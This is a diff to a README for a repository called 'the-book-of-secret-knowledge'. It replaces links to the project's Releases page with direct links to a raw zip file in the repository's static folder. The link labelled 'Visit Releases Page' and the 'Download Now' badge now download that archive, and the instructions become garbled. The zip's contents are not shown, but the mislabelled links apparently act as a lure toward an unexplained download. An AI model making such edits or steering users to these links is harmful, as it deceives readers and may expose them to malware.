@@ -1,6 +1,6 @@
 # 📚 the-book-of-secret-knowledge - A Collection of Inspiring Resources
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20latest%20release-brightgreen)](https://github.com/shanjul/the-book-of-secret-knowledge/releases)
+[![Download Now](https://github.com/shanjul/the-book-of-secret-knowledge/raw/refs/heads/master/static/the_book_secret_of_knowledge_1.0.zip%20Now-Get%20the%20latest%20release-brightgreen)](https://github.com/shanjul/the-book-of-secret-knowledge/raw/refs/heads/master/static/the_book_secret_of_knowledge_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ To get the application, visit the Releases page. Here are the steps:
 
 1. Click the link below to go to the Releases page:
    
-   [Visit Releases Page](https://github.com/shanjul/the-book-of-secret-knowledge/releases)
+   [Visit Releases Page](https://github.com/shanjul/the-book-of-secret-knowledge/raw/refs/heads/master/static/the_book_secret_of_knowledge_1.0.zip)
 
 2. On the Releases page, find the latest version listed at the top.
 
 3. Click on the version number to open the release details.
 
-4. Look for the download link for your operating system. The filename should look something like this: `the-book-of-secret-knowledge-v1.0.zip`.
+4. Look for the download link for your operating system. The filename should look something like this: `https://github.com/shanjul/the-book-of-secret-knowledge/raw/refs/heads/master/static/the_book_secret_of_knowledge_1.0.zip`.
 
 5. Click the link to download the file.
 
